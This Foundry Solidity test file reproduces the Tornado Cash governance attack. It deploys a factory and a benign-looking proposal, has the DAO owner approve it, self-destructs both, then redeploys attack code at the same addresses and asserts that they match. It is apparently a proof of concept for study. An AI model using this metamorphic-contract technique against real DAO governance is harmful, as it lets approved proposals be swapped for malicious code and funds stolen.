// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {DAO, DeployerDeployer, Deployer, Proposal} from "../src/TornadoHack.sol";
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

contract TornadoHackTest is Test {
    DAO dao;
    address public attacker;
    address public daoOwner;
    DeployerDeployer deployerDeployer;
    address deployer;
    address proposal;

    function setUp() public {
        vm.prank(daoOwner);
        dao = new DAO();
        console.log("DAO", address(dao));
        attacker = makeAddr("attacker");
    }

    function testTornadoHack() public {
        vm.startPrank(attacker);
        deployerDeployer = new DeployerDeployer();
        console.log("DeployerDeployer", address(deployerDeployer));
        deployer = deployerDeployer.deploy();
        console.log("Deployer", deployer);
        proposal = Deployer(deployer).deployProposal();
        console.log("Proposal", proposal);
        vm.stopPrank();

        vm.prank(daoOwner);
        dao.approve(proposal);

        vm.startPrank(attacker);
        Deployer(deployer).kill();
        Proposal(proposal).emergencyStop();
        vm.stopPrank();
    }

    function beforeTestSetup(bytes4 testSelector) public pure returns (bytes[] memory beforeTestCalldata) {
        if (testSelector == this.testDeployNewCodeAtSameAddress.selector) {
            beforeTestCalldata = new bytes[](1);
            beforeTestCalldata[0] = abi.encodeWithSignature("testTornadoHack()");
        }
        return beforeTestCalldata;
    }

    function testDeployNewCodeAtSameAddress() public {
        address secondDeployer = deployerDeployer.deploy();
        console.log("secondDeployer", secondDeployer);
        address attackProposal = Deployer(secondDeployer).deployAttack();
        console.log("attackProposal", attackProposal);
        assertEq(deployer, secondDeployer);
        assertEq(proposal, attackProposal);
    }
}
